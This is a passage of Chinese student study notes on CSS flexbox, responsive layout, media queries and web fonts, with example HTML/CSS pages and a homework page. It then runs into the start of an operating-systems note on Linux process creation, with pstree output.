html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;flex-direction&lt;/title&gt; &lt;style&gt; *&#123; margin: 0; padding: 0; &#125; .menu&#123; width: 100%; display: -webkit-flex;/*兼容*/ display: -moz-flex;/*兼容*/ display: -o-flex;/*兼容*/ display: -ms-flex;/*兼容*/ display: flex; font-size: 40px; /*flex-direction: row;*/ /*flex-direction: row-reverse;!*右对齐*!*/ /*flex-direction: column;!*纵向*!*/ flex-direction: column-reverse;/*纵向反向*/ &#125; .menu li&#123; list-style-type: none; width: 15%; text-align: center; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;ul class=&quot;menu&quot;&gt; &lt;li&gt;菜单项1&lt;/li&gt; &lt;li&gt;菜单项2&lt;/li&gt; &lt;li&gt;菜单项3&lt;/li&gt; &lt;li&gt;菜单项4&lt;/li&gt; &lt;li&gt;菜单项5&lt;/li&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt; justify-content：应用于弹性容器上，把弹性项沿着弹性容器的主轴线(main axis)对齐。此属性作用于父容器。 语法 1justify-content: flex-start|flex-end|center|space-between|space-around; flex-start：弹性项目向行头紧挨着填充。这是默认值。第一个弹性项的main-start外边距线被放置在该行的main-start边线，而后续弹性项依次平齐摆放。(紧凑方式左对齐) flex-end：弹性项目向行尾紧挨着填充。这是默认值。第一个弹性项的main-end外边距线被放置在该行的main-end边线，而后续弹性项依次平齐摆放。（紧凑方式右对齐） center：弹性项目居中紧挨着填充。（如果剩余的自由空间是负的，则弹性项目将在两个方向上同时溢出。）（紧凑方式居中对齐） space-between：弹性项目平均分布在该行上。如果剩余空间为负或者只有一个弹性项，则该值等同于flex-start。否则，第一弹性项的外边距和行的main-start边线对齐，而最后一个弹性项的外边距和行的mian-end边线对齐，然后剩余的弹性项分布在该行上，相邻项目的时间间隔相等。（除了第一个和最后一个子元素外，其他子元素等分空白区域） space-around：弹性项目平均分布在该行上，两边留有一半的间隔空间。如果剩余空间为负或者只有一个弹性项，则该值等同于center。否则，弹性项目沿着该行分布，且彼此间隔相等（比如是20px），同时首尾两边和弹性容器之间留有一半的间隔。（1/2*20px= 10px）（所有子元素等分空白区域） align-items：设置或检索弹性盒子元素在侧轴（纵轴）方向上的对齐方式。此属性作用于父容器。 语法 12align-items: flex-start|flex-end|center|baseline|stretch; flex-start：沿着纵轴顶端对齐。(默认值) flex-end：沿着纵轴底端对齐。 center：沿着纵轴垂直居中对齐。 baseline：沿着纵轴基线对齐。（主要用于文字） stretch：纵向拉伸对齐。（纵向铺满） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;align-items&lt;/title&gt; &lt;style&gt; .box&#123; width: 100%; height: 600px; display: -o-flex; display: -webkit-flex; display: -moz-flex; display: -ms-flex; display: flex; border: 2px navy solid; /*align-items: flex-start;!*默认值*!*/ /*align-items: flex-end;!*底端对齐*!*/ /*align-items: center;!*中间对齐*!*/ /*align-items: baseline;!*基线对齐*!*/ align-items: stretch;/*拉伸对齐*/ &#125; .box div&#123; width: 300px; color: #fff; text-align: center; &#125; .box1&#123; /*height: 200px;*/ background-color: #8080ff; &#125; .box2&#123; /*height: 400px;*/ background-color: #00ffff; font-size: 30px; &#125; .box3&#123; /*height: 300px;*/ background-color: #ff8070; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;box&quot;&gt; &lt;div class=&quot;box1&quot;&gt;第一个盒子&lt;/div&gt; &lt;div class=&quot;box2&quot;&gt;第二个盒子&lt;/div&gt; &lt;div class=&quot;box3&quot;&gt;第三个盒子&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; flex-grow：定义项目的放大比例，默认为0，即如果存在剩余空间，也不放大。该属性作用于子元素。 语法 1flex-grow: &lt;number&gt;; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;flex-grow&lt;/title&gt; &lt;style&gt; .box&#123; width: 100%; height: 600px; display: -o-flex; display: -webkit-flex; display: -moz-flex; display: -ms-flex; display: flex; border: 2px navy solid; &#125; .box1&#123; height: 200px; width: 0; background-color: #8080ff; flex-grow: 1;/*20%*/ &#125; .box2&#123; height: 400px; width: 0; background-color: #00ffff; font-size: 30px; flex-grow: 3;/*60%*/ &#125; .box3&#123; height: 300px; width: 0; background-color: #ff8070; flex-grow: 1;/*20%*/ /*其实他不是真正意义上的等分宽度，而是等分剩余宽度，而剩余宽度是总宽度减去内容宽度，再进行等分。而且这个等分甚至还是根据内容多少来等分，有的内容多，他等分还多一些。*/ /*实现等分: 给每个box加上width: 0;*/ &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;box&quot;&gt; &lt;div class=&quot;box1&quot;&gt;第一个盒子&lt;/div&gt; &lt;div class=&quot;box2&quot;&gt;第二个盒子&lt;/div&gt; &lt;div class=&quot;box3&quot;&gt;第三个盒子&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; flex：用于指定弹性元素如何分配空间。作用于子元素。 语法 1flex: auto|initial|none|inherit|[flex-grow]||[flex-shrink]||[flex-basis]; auto：等价于 1 1 auto initial：等价于 0 1 auto none：等价于 0 0 auto inherit：从父元素继承 flex-shrink：收缩比例（当子元素超出父元素时才生效，是一种宽度损失规则。） flex-basis：默认基准值 tips: flex可以带1到3个参数 带1个参数 无单位：数值会被当做flex-grow（放大比例）的值 带单位：这个数值会被当做flex-basis（基本宽度）的值 auto（自动宽度）|initial（初始宽度）|none（无） min-width: 1000px;/*低于1000px会出现滚动条*/ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768 * 带2个参数： 第1个参数必须是无单位的数值，这个数值会被当做flex-grow的值。 第2个参数： * 无单位：数值会被当做flex-shrink（收缩比例）的值 * 带单位：这个数值会被当做flex-basis（基本宽度）的值 * 带3个参数： 第1个参数必须是无单位的数值，这个数值会被当做flex-grow的值。 第2个参数必须是无单位的数值，这个数值会被当做flex-shrink的值。 第3个参数必须是一个有效的宽度值（有单位），它会被当做基准宽度。```html&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;flex&lt;/title&gt; &lt;style&gt; .box&#123; width: 100%; height: 600px; background-color: #8080ff; display: flex; display: -o-flex; display: -moz-flex; display: -ms-flex; display: -webkit-flex; /*min-width: 1000px;!*低于1000px会出现滚动条*!*/ &#125; .box div&#123; /*flex: auto;*/ /*flex: 1 1 auto;*/ /*flex: 1;*/ /*flex: initial;!*初始*!*/ /*flex: none;*/ &#125; .box1&#123; background-color: #ff8070; flex: 1; &#125; .box2&#123; background-color: #6a8bbc; /*flex: 1 5;*/ /*flex: 1 500px;*/ flex: 1 2 10px; &#125; .box3&#123; background-color: greenyellow; flex: 2; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;box&quot;&gt; &lt;div class=&quot;box1&quot;&gt;&lt;/div&gt; &lt;div class=&quot;box2&quot;&gt;&lt;/div&gt; &lt;div class=&quot;box3&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 9.4 响应式布局概念：响应式布局（Responsive Design）在实现不同分辨率的终端上浏览网页的不同展示方式。通过响应式设计能使网站在手机和平板上有更好的浏览阅读体验。 响应式与自适应的区别： 响应式布局只开发一套代码，通过检测视口的分辨率，针对不同客户端，在客户端做代码处理，来展现不同的布局和内容。 自适应需要开发多套界面，通过检测视口的分辨率，判断当前访问的设备是PC还是手机/平板，从而请求服务层，返回不同的页面。 响应式布局等同于流动网格布局，而自适应等同于使用固定分割点来进行布局。 自适应布局给出了更多的设计空间，只用考虑几种不同的状态即可，而响应式布局需要考虑上百种不同的状态，虽然有些状态差异较小，但也要考虑到。 响应式开发实现方法： 媒体查询（一般不用） 百分比布局 rem布局：相对于根节点（元素）HTML中的字号布局 视口单位布局(vw/vh)：相对于窗口大小布局（视口：不同的客户端） 响应式设计步骤： 设置meta标签 通过媒体查询来设置样式 设置多种视图的宽度 宽度需要使用%/rem/vw$vh等 处理图片缩放 其他属性处理 pre/iframe/video等，都要缩放其大小 table建议不要增加padding属性，低分辨率下要使用内容居中操纵 9.5 媒体查询媒体查询通过不同的媒体类型和条件定义样式表规则。 步骤： 设置meta标签 1&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,usr-scalable=no&quot;&gt; 说明：以上标签内容只能被移动端设备识别。 view-point：视口（移动端） width=device-width：宽度等于当前设备的宽度。 initial-scale=1.0：初始缩放比例（默认为1.0） maximum-scale=1.0：允许用户缩放到的最大比例（默认为1.0） minimum-scale=1.0：允许用户缩放到的最小比例（默认为1.0） usr-scalable=no：是否可以手动缩放（默认为no） 设置IE默认渲染方式 默认为最高版本 1&lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;IE=Edge,chrome=1&quot;&gt; 说明：以上代码表示如果浏览器有chrome插件，将以chrome提供的V8引擎渲染页面；如果没有，将以IE的最高版本渲染页面。（chrome渲染更快） 引入兼容的JS文件 1234&lt;!--[if lt IE 9]&gt; &lt;script src=&quot;https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js&quot;&gt;&lt;/script&gt; &lt;![endif]--&gt; 解释：如果浏览器版本小于IE9，那么就加载下面的两个文件。 因为IE8及其以下版本，既不支持HTML5，也不支持CSS3 中的Media，所以我们需要加载JS文件来处理兼容。 if和endif是一个注释语句(条件hacker)，也就是说，IE9及以上版本不会编译这几行代码。 进入CSS3提供的媒体查询功能 第一种方案：引入外部CSS文件时使用 1234&lt;link rel=&quot;stylesheet&quot; href=&quot;CSS/screen480.css&quot; media=&quot;screen and (max-width:480px)&quot;&gt;&lt;!--屏幕最大为480时，加载该文件--&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;CSS/screen800.css&quot; media=&quot;screen and (min-width:480px) and (max-width:800px)&quot;&gt;&lt;!--屏幕最小为480，最大为800时，加载该文件--&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;CSS/screengt800.css&quot; media=&quot;screen and (min-width:800px)&quot;&gt;&lt;!--屏幕最小为800时，加载该文件--&gt; 1234/*screen480.css*/body&#123; background-color: #ffff00;&#125; 1234/*screen800.css*/body&#123; background-color: #ff00ff;&#125; 1234/*screengt800.css*/body&#123; background-color: #00ffff;&#125; 设备： all：所有设备 * screen: PC端显示器 * print：打印机/打印预览图 handheld：移动便携设别 TV：电视 speech：音频合成器 braille：盲人点触设别 embossed：盲人打印机 projection：投影设备 tty：固定密度字母栅格设备 only：排除不支持媒体查询的浏览器 * 第二种方案：在style标签中用@media定义 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;媒体查询2&lt;/title&gt; &lt;style&gt; *&#123; margin: 0; padding: 0; &#125; .menu&#123; overflow: hidden; width: 100%; height: 44px; line-height: 44px; &#125; li&#123; list-style-type: none; float: left; width: 20%; text-align: center; background-color: #8080ff; &#125; a&#123; text-decoration: none; color: white; &#125; @media screen and (max-width: 480px)&#123; .menu&#123; display: none; &#125; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;ul class=&quot;menu&quot;&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;菜单项1&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;菜单项2&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;菜单项3&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;菜单项4&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;菜单项5&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;媒体查询3&lt;/title&gt; &lt;style&gt; *&#123; margin: 0; padding: 0; &#125; body&#123; padding: 0 10px; &#125; section&#123; overflow: hidden; &#125; /*.row1 div,.row2 .div,.row3 div,.row4 div*/ section div&#123; float: left; &#125; .row1 div&#123; width: 48%; height: 100px; background-color: #8080ff; &#125; .row1 div:first-child&#123; margin-right: 4%; &#125; .row2 div&#123; margin-top: 10px; width: 100%; height: 200px; background-color: #ff8070; &#125; .row3,.row4&#123; margin-top: 10px; &#125; .row3 div&#123; width: 30%; height: 100px; background-color: #00ffff; margin-left: 5%; &#125; .row3 div:first-child&#123; margin-left: 0; &#125; .row4&#123; margin-top: 10px; &#125; .row4 div&#123; width: 22%; height: 150px; background-color: #555500; margin-right: 4%; &#125; .row4 div:last-child&#123; margin-right: 0; &#125; @media screen and (max-width: 600px)&#123; .row1 div&#123; width: 100%; margin-bottom: 10px; &#125; .row3 div&#123; width: 100%; margin-bottom: 10px; &#125; .row4 div&#123; width: 48%; margin-bottom: 10px; margin-right: 2%; &#125; .row3 div+div&#123; margin-left: 0; &#125; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;section class=&quot;row1&quot;&gt; &lt;div class=&quot;div&quot;&gt;1&lt;/div&gt; &lt;div class=&quot;div&quot;&gt;2&lt;/div&gt; &lt;/section&gt; &lt;section class=&quot;row2&quot;&gt; &lt;div class=&quot;div&quot;&gt;3&lt;/div&gt; &lt;/section&gt; &lt;section class=&quot;row3&quot;&gt; &lt;div class=&quot;div&quot;&gt;4&lt;/div&gt; &lt;div class=&quot;div&quot;&gt;5&lt;/div&gt; &lt;div class=&quot;div&quot;&gt;6&lt;/div&gt; &lt;/section&gt; &lt;section class=&quot;row4&quot;&gt; &lt;div class=&quot;div&quot;&gt;7&lt;/div&gt; &lt;div class=&quot;div&quot;&gt;8&lt;/div&gt; &lt;div class=&quot;div&quot;&gt;9&lt;/div&gt; &lt;div class=&quot;div&quot;&gt;10&lt;/div&gt; &lt;/section&gt;&lt;/body&gt;&lt;/html&gt; 9.6 WEB字体开发者引入外部字体语法： 1234@font-face&#123; font-family: 字体名; src: url(&quot;字体文件.ttf&quot;) format(&quot;字体文件格式以处理浏览器兼容问题&quot;), url(&quot;字体文件.woff&quot;) format(&quot;&quot;);&#125; 说明：可以同时引入多个字体文件，字体一样，文件的扩展名不一样，目的是处理浏览器兼容。 12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;WEB字体&lt;/title&gt; &lt;style&gt; body&#123; background-color: #000; &#125; @font-face&#123; font-family: stick; src: url(&quot;Font/1.ttf&quot;) format(&quot;truetype&quot;); &#125; p&#123; font-family: stick; font-size: 28px; color: white; font-weight: bolder; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt; 据中国载人航天工程办公室消息，经监测分析，2021年5月9日10时24分，长征五号B遥二运载火箭末级残骸已再入大气层，落区位于东经72.47°，北纬2.65°周边海域，绝大部分器件在再入大气层过程中烧蚀销毁。 &lt;/p&gt;&lt;/body&gt;&lt;/html&gt; iconfont的使用矢量图网站 ：由阿里巴巴提供的一种图标字体(可以把图标当做文字来处理，比如设置颜色。) 步骤： 进入网站注册，登录 创建项目 添加图标到购物车 将购物车中的图标添加到项目中 下载iconfont文件，解压后，将部分文件复制到网页项目中（去掉js和html文件） 使用字体图标前，先引入iconfont.css文件 使用方法： 方法一：名称 方法二：unicode值(微信小程序开发不支持这种写法) 12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;iconfont&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;iconfont/css/iconfont.css&quot;&gt; &lt;style&gt; li&#123; list-style-type: none; &#125; i&#123; color: #8080ff; margin-right: 5px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;button class=&quot;iconfont iconliwu&quot;&gt;&lt;/button&gt; &lt;button class=&quot;iconfont iconliwu&quot;&gt;&lt;/button&gt; &lt;button class=&quot;iconfont iconliwu&quot;&gt;&lt;/button&gt; &lt;button class=&quot;iconfont iconliwu&quot;&gt;&lt;/button&gt; &lt;ul&gt; &lt;li&gt;&lt;i class=&quot;iconfont&quot;&gt;&amp;#xe6de;&lt;/i&gt;列表1&lt;/li&gt; &lt;li&gt;&lt;i class=&quot;iconfont&quot;&gt;&amp;#xe6de;&lt;/i&gt;列表2&lt;/li&gt; &lt;li&gt;&lt;i class=&quot;iconfont&quot;&gt;&amp;#xe6de;&lt;/i&gt;列表3&lt;/li&gt; &lt;li&gt;&lt;i class=&quot;iconfont&quot;&gt;&amp;#xe6de;&lt;/i&gt;列表4&lt;/li&gt; &lt;li&gt;&lt;i class=&quot;iconfont&quot;&gt;&amp;#xe6de;&lt;/i&gt;列表5&lt;/li&gt; &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt; 课后实训第8次作业.css 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193*&#123; margin: 0; padding: 0;&#125;body&#123; min-width: 700px;&#125;header&#123; margin: auto 1%; border-bottom-right-radius: 50px; border-bottom-left-radius: 50px; border-top-right-radius: 20px; border-top-left-radius: 20px;&#125;header .banner&#123; overflow: hidden; height: 80px; line-height: 80px; background: linear-gradient(to left,#000,#8080ff,#000); border-top-right-radius: 20px; border-top-left-radius: 20px;&#125;header .banner h1&#123; font-family: snow; font-weight: lighter; font-size: 50px; float: left; margin-right: 150px; color: white; text-align: center; text-shadow: 3px 3px 6px #00ffff;&#125;header ul&#123; overflow: hidden; display: flex; display: -o-flex; display: -ms-flex; display: -moz-flex; display: -webkit-flex; justify-content: space-around;&#125;header .banner ul li&#123; list-style-type: none; float: left; font-family: blackborad; text-align: center; padding: 0 10px;&#125;header .banner ul li a&#123; text-decoration: none; color: white; text-shadow: 2px 2px 2px #87faf8;&#125;header .banner ul li:hover&#123; color: black; background-color: #fff; -webkit-border-radius: 25%; -moz-border-radius: 25%; border-radius: 25%; box-shadow: 1px 1px 1px #00ffff;&#125;header .banner ul li:hover a&#123; color: black; text-shadow: 2px 2px 2px red;&#125;.content&#123; background: linear-gradient(to left,#aaaaaa,#dea46b,#aaaaaa); overflow: hidden; display: flex; border-bottom-right-radius: 50px; border-bottom-left-radius: 50px;&#125;.content img&#123; width: 15%; height: 15%; margin: 30px 0 30px; border: 10px groove dodgerblue;&#125;.content .words&#123; margin-left: 10%; overflow: hidden;&#125;.content .words h2&#123; font-family: stick; margin: 30px 0 30px 0; color: white; font-size: 35px; text-shadow: 3px 3px 2px black;&#125;.content .words p&#123; margin-top: 30px; font-size: 20px; text-shadow: 3px 3px 2px black; color: white; font-family: snow;&#125;.content p:last-child&#123; background-color: black;&#125;header .content .words ul&#123; height: 50px; line-height: 50px; margin-top: 30px; margin-bottom: 30px; float: left;&#125;header .content .words ul li&#123; font-size: 20px; text-shadow: 3px 3px 2px black; list-style-type: none; color: white; font-family: snow; padding: 0 10px; text-align: center;&#125;header .content .words ul li a&#123; text-decoration: none;&#125;header .content .words ul li:hover&#123; color: black; background-color: white; border-radius: 10px; box-shadow: 2px 2px 1px 3px inset;&#125;i&#123; color: black; margin-right: 10px; -webkit-transition: color 1s ease-in-out; -moz-transition: color 1s ease-in-out; -ms-transition: color 1s ease-in-out; -o-transition: color 1s ease-in-out; transition: color 1s ease-in-out;&#125;i:hover&#123; color: red;&#125;section&#123; margin: 50px 2%; display: flex; display: -moz-flex; display: -o-flex; display: -ms-flex; display: -webkit-flex; justify-content: space-between;&#125;section div&#123; border-top-left-radius: 10%; border-top-right-radius: 10%; box-shadow: 5px 5px 5px black;&#125;section div p&#123; background: #8080ff; line-height: 80px; height: 80px; padding: 0 20px; border-top-left-radius: 10%; border-top-right-radius: 10%; font-family: spring; font-size: 20px; color: white;&#125;section div ul&#123; list-style-type: none; background-color: #eee;&#125;section div ul li&#123; padding: 20px 0 0 20px; font-family: autumn;&#125;section div ul li:last-child&#123; padding-bottom: 30px;&#125;@media screen and (min-width:800px) &#123; section div&#123; width: 20%; &#125;&#125;footer&#123; background-color: #808000; height: 60px; border-radius: 15px; box-shadow: 3px 3px 3px black inset; margin-bottom: 20px;&#125;footer p&#123; line-height: 60px; color: white; font-family: slience; margin-left: 20px;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;第九天实训&lt;/title&gt; &lt;!--引入字体--&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./CSS/font.css&quot;&gt; &lt;!--引入CSS布局--&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./CSS/第8次作业.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./iconfont/css/iconfont.css&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;!--导航栏--&gt; &lt;header&gt; &lt;div class=&quot;banner&quot;&gt; &lt;h1&gt;张加林&lt;/h1&gt; &lt;ul&gt; &lt;li&gt;&lt;a href=&quot;https://miketaylorjuly123.cn&quot;&gt;主页&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;https://miketaylorjuly123.cn&quot;&gt;个人信息&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;https://miketaylorjuly123.cn&quot;&gt;联系方式&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;https://miketaylorjuly123.cn&quot;&gt;友链&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;https://miketaylorjuly123.cn&quot;&gt;反馈&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;!--内容栏--&gt; &lt;div class=&quot;content&quot;&gt; &lt;img src=&quot;./imgs/payment.jpg&quot; alt=&quot;&quot;&gt; &lt;div class=&quot;words&quot;&gt; &lt;h2&gt;卓越软件工程师&lt;/h2&gt; &lt;p&gt;年龄19岁，目前处于本科大二学习阶段，当前学期主要学习内容：数据库、智慧视觉、计算机基础课程。&lt;/p&gt; &lt;p&gt;课外目标：该学期学完HTML、CSS以及JS基础部分，以及VUE的简单架构，必要的话还需要学习Java、人工神经网络。&lt;/p&gt; &lt;ul&gt;&lt;li&gt;&lt;a href=&quot;&quot;&gt;&lt;i class=&quot;iconfont&quot;&gt;&amp;#xe6e7;&lt;/i&gt;&lt;/a&gt;了解更多&lt;/li&gt;&lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/header&gt; &lt;section&gt; &lt;div class=&quot;first&quot;&gt; &lt;p&gt;大一上课程&lt;/p&gt; &lt;ul&gt; &lt;li&gt;微积分&lt;/li&gt; &lt;li&gt;线性代数&lt;/li&gt; &lt;li&gt;C程序设计&lt;/li&gt; &lt;li&gt;大学英语&lt;/li&gt; &lt;li&gt;近代史&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;div class=&quot;second&quot;&gt; &lt;p&gt;大一下课程&lt;/p&gt; &lt;ul&gt; &lt;li&gt;微积分&lt;/li&gt; &lt;li&gt;大学物理&lt;/li&gt; &lt;li&gt;离散数学&lt;/li&gt; &lt;li&gt;公共演讲&lt;/li&gt; &lt;li&gt;思修&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;div class=&quot;third&quot;&gt; &lt;p&gt;大二上课程&lt;/p&gt; &lt;ul&gt; &lt;li&gt;概率论&lt;/li&gt; &lt;li&gt;计算机组成原理&lt;/li&gt; &lt;li&gt;人工智能&lt;/li&gt; &lt;li&gt;交通管理与控制&lt;/li&gt; &lt;li&gt;综合课程设计&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;div class=&quot;forth&quot;&gt; &lt;p&gt;大二下课程&lt;/p&gt; &lt;ul&gt; &lt;li&gt;操作系统&lt;/li&gt; &lt;li&gt;计算机网络&lt;/li&gt; &lt;li&gt;数据库&lt;/li&gt; &lt;li&gt;商务英语&lt;/li&gt; &lt;li&gt;数据库&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/section&gt; &lt;footer&gt; &lt;p&gt;版本号：01 作者：张加林 时间：2021 / 05 / 09 / 22:12&lt;/p&gt; &lt;/footer&gt;&lt;/body&gt;&lt;/html&gt; font.css 123456789101112131415161718192021222324252627@font-face &#123; font-family: stick; src: url(&quot;../Font/stick.ttf&quot;) format(&quot;truetype&quot;);&#125;@font-face &#123; font-family: rabit; src: url(&quot;../Font/rabit.ttf&quot;) format(&quot;truetype&quot;);&#125;@font-face &#123; font-family: snow; src: url(&quot;../Font/汉仪雪君体简.ttf&quot;) format(&quot;truetype&quot;);&#125;@font-face &#123; font-family: spring; src: url(&quot;../Font/演示春风楷.ttf&quot;) format(&quot;truetype&quot;);&#125;@font-face &#123; font-family: autumn; src: url(&quot;../Font/演示秋鸿楷.ttf&quot;) format(&quot;truetype&quot;);&#125;@font-face &#123; font-family: blackborad; src: url(&quot;../Font/鸿雷板书简体.ttf&quot;) format(&quot;truetype&quot;);&#125;@font-face &#123; font-family: slience; src: url(&quot;../Font/默陌山魂手迹.ttf&quot;) format(&quot;truetype&quot;);&#125;","categories":[],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/CSS/"}]},{"title":"操作系统2-4章部分笔记","slug":"操作系统2-4章","date":"2021-04-19T02:01:39.000Z","updated":"2021-11-22T07:45:19.296Z","comments":true,"path":"2021/04/19/操作系统2-4章/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/04/19/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F2-4%E7%AB%A0/","excerpt":"","text":"教材：《计算机操作系统》（第四版） 汤子丹等 Linux进程控制进程创建UNIX/Linux中创建进程的方式： ①在shell中执行命令或可执行文件 由shell进程调用fork函数创建子进程 ②在代码中（已经存在的进程中）调用fork 函数创建子进程 fork创建的进程为子进程 原进程为父进程 拓展：Linux 操作系统下的进程与线程相同点是都有进程控制块(Process Control Block，PCB)， 具体的类是 task_struct，区别在于一个是独立的进程资源，一个是共享的进程资源。内核线 程完全没有用户空间，进程资源包括进程的 PCB、线程的系统堆栈、进程的用户空间、进程 打开的设备(文件描述符表)等。Linux 用户进程不能直接被创建，因为不存在这样的 API，它只能从某个进程中复制，有 的需要通过 exec 这样的 API 来切换到实际想要运行的程序文件。复制 API 包括 3 种:fork、clone、vfork。在 Linux 源代码中，这 3 个函数的执行过程是执行 fork、clone、vfork 时，通过一个系统 调用表映射到sys_fork、sys_clone、sys_vfork，再在这 3 个函数中调用 do_fork 做具体的创建 进程工作。这 3 个 API 的内部实际都是调用一个内核内部函数do_fork，只是填写的参数不 同而已。 Linux系统中，进程0（PID=0）是由内核创建，其他所有进程都是由父进程调用fork函数创建的。 Linux系统中进程0在创建子进程（PID=1，init进程）后，进程0就转为交换进程，或者空闲状态。 进程1（init进程）是系统中其他所有进程的共同祖先。 1user@user-virtual-machine:~$ pstree 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125systemd─┬─ManagementAgent───6*[&#123;ManagementAgent&#125;] ├─ModemManager───2*[&#123;ModemManager&#125;] ├─NetworkManager─┬─dhclient │ └─2*[&#123;NetworkManager&#125;] ├─VGAuthService ├─accounts-daemon───2*[&#123;accounts-daemon&#125;] ├─acpid ├─avahi-daemon───avahi-daemon ├─boltd───2*[&#123;boltd&#125;] ├─colord───2*[&#123;colord&#125;] ├─cron ├─cups-browsed───2*[&#123;cups-browsed&#125;] ├─cupsd ├─dbus-daemon ├─fwupd───4*[&#123;fwupd&#125;] ├─gdm3─┬─gdm-session-wor─┬─gdm-wayland-ses─┬─gnome-session-b─┬─gnome-sh+ │ │ │ │ ├─gsd-a11y+ │ │ │ │ ├─gsd-clip+ │ │ │ │ ├─gsd-colo+ │ │ │ │ ├─gsd-date+ │ │ │ │ ├─gsd-hous+ │ │ │ │ ├─gsd-keyb+ │ │ │ │ ├─gsd-medi+ │ │ │ │ ├─gsd-mous+ │ │ │ │ ├─gsd-powe+ │ │ │ │ ├─gsd-prin+ │ │ │ │ ├─gsd-rfki+ │ │ │ │ ├─gsd-scre+ │ │ │ │ ├─gsd-shar+ │ │ │ │ ├─gsd-smar+ │ │ │ │ ├─gsd-soun+ │ 